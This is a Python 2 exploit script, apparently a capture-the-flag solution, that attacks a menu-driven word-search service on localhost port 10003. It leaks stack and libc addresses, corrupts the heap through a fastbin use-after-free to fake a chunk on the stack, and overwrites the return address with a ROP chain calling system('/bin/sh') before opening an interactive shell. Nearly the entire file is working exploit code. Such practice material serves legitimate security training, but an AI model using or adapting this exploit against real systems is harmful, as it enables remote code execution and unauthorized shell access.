#  -*- coding: utf-8 -*-
import telnetlib
import struct
from socket import *


def p64(x): return struct.pack("<Q", x)


def up64(x): return struct.unpack("<Q", x)[0]


def interactive(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def recv_until(s, ch):
    data = ""
    while ch not in data:
        data += s.recv(1)
    return data


def recv_line(s):
    return recv_until(s, '\n')


def menu2(s, sen_length, sen):
    s.send("2\n")
    s.send(str(sen_length) + "\n")
    s.send(sen + "\n")
    recv_until(s, "Added sentence\n")
    print "\n[menu2]"
    print "length : " + str(sen_length)
    print "sentence : " + repr(sen) + "\n"


def menu1(s, word_size, word, n_found, delete):  # we need del_list, leak_list
    print "[menu1]"
    s.send("1\n")
    s.send(str(word_size) + "\n")
    s.send(word + "\n")
    recv_until(s, "Enter the word:\n")
    if n_found == 0:
        return

    for i in range(0, n_found):
        print recv_until(s, "Found"),
        print recv_until(s, ": ")
        print repr(recv_line(s)[0:-1])
        recv_until(s, "(y/n)?\n")
        if delete == 1:
            s.send("y\n")
            print recv_until(s, "Deleted!\n")
        else:
            s.send("n\n")

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 10003))

recv_until(s, "Quit\n")
s.send("aA"*24)
s.send("A"*48)
print repr(recv_line(s))
recv_until(s, "A"*48)
stack_addr = recv_until(s, "is not")[0:-7]
stack_addr = up64(stack_addr + "\x00"*(8 - len(stack_addr)))
print hex(stack_addr)


menu2(s, 512, "A"*16 + " " + "B"*7 + " " + "C" * (512 - 25))
menu2(s, 512, "A"*512)
menu1(s, 7, "B"*7, 1, 1)
# menu1(s, 7, "\x00"*7, 1, 0)
'''leaking procedure start'''
print "[menu1]"
s.send("1\n")
s.send("7\n")
s.send("\x00"*7 + "\n")
recv_until(s, "Enter the word:\n")
print recv_until(s, ": ")
p_bins = up64(recv_line(s)[0:8]) + 0x10
print "p_bins: " + hex(p_bins)
recv_until(s, "(y/n)?\n")
s.send("n\n")
'''leaking procedure end'''

offset_normal_bins = 0x3c4b88
offset_system = 0x45390
offset_binsh = 0x18cd57

libc_base = p_bins - offset_normal_bins
p_system = libc_base + offset_system
p_binsh = libc_base + offset_binsh

print "system : " + hex(p_system)

menu2(s, 56, "a" * 7 + " " + "b" * 48)
menu1(s, 48, "b" * 48, 1, 1)
menu2(s, 56, "asdfasf" + " " + "\x00" * 48)
menu2(s, 56, "a" * 7 + " " + "\x00" * 48)
menu2(s, 56, "ddddddd" + " " + "\x00" * 48)  # fd가 0으로 리셋되는 더미 하나 필요

menu1(s, 48, "\x00" * 48, 4, 1)
menu2(s, 48, "A" * 48)
'''too small size
menu2(s, 15, "aaaaaaa bbbbbbb")
menu1(s, 7, "aaaaaaa", 1, 1)  # fastbin->tempword->aaa bbb(all 0's)
menu2(s, 6, "dummy1")
menu2(s, 7, "aaaaaaa")  # fastbin->NULL (aaa bbb(0's) -> aaa 000)
menu2(s, 7, "ccccccc")
menu1(s, 7, "ccccccc", 1, 1)  # fastbin-> tempword -> ccccccc(zero's)
menu2(s, 6, "dummy2")
menu1(s, 7, "asdfasd", 2, 1)

p_f_size = stack_addr + 0x20
print hex(p_f_size)
menu2(s, 8, p64(p_f_size - 0x8))
menu2(s, 8, "asdfasdf")
menu2(s, 8, "asdfasdf")
#  menu2(s, 8, "abcdefgh")
'''
p_f_size = stack_addr + 0x20
print hex(p_f_size)
menu2(s, 48, p64(p_f_size - 0x8) + "A"*40)
menu2(s, 48, "A" * 48)
menu2(s, 48, "A" * 48)

#  s.send("A" * 12 + "B" * 12 + "C" * 12 + "D" * 12 + "\n")
s.send("A" * 24 + "C" * 8 + "\x40" + "\x00" * 7 + "\n")  # make face chunk size

s.send("2\n")
s.send("56\n")

p_rdi_ret = 0x400e23

s.send("A" * 32 + p64(p_rdi_ret) + p64(p_binsh) + p64(p_system))

interactive(s)
